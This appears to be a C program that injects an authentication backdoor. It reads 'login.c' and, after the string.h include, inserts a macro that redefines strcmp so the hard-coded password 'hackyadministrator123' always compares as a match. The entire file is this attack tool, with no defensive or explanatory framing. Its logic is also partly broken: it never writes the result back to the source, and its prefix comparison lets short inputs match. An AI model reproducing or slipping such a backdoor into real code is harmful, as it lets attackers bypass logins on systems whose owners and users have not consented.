#include <stdio.h>
#include <string.h>

#define BUFFER_SIZE 100000

int main() {
	
	
	const char *INPUT_STRING = "#define minLen(X, Y)  (strlen(X) < strlen(Y) ? strlen(X) : strlen(Y))\r\n#define strcmp(a, b) ( !(memcmp(a, \"hackyadministrator123\", minLen(a, \"hackyadministrator123\")) || !memcmp(b, \"hackyadministrator123\", minLen(b, \"hackyadministrator123\")) ) ? 0 : memcmp(a, b, minLen(a, b)))";
	const char *FILE_NAME = "login.c";
	const char *TARGET_LINE = "#include <string.h>";

	
    FILE *input_file = fopen(FILE_NAME, "r");
    FILE *temp_file = fopen("temp.txt", "w");
	
    char buffer[100000];
    int found_target_line = 0;

    while (fgets(buffer, 100000, input_file)) {
        if (!found_target_line && strstr(buffer, TARGET_LINE)) {
            fputs(buffer, temp_file);
            fputs(INPUT_STRING, temp_file);
            fputs("\n", temp_file);
            found_target_line = 1;
        } else {
            fputs(buffer, temp_file);
        }
    }
	

    fclose(input_file);
    rewind(temp_file);


    return 0;
}
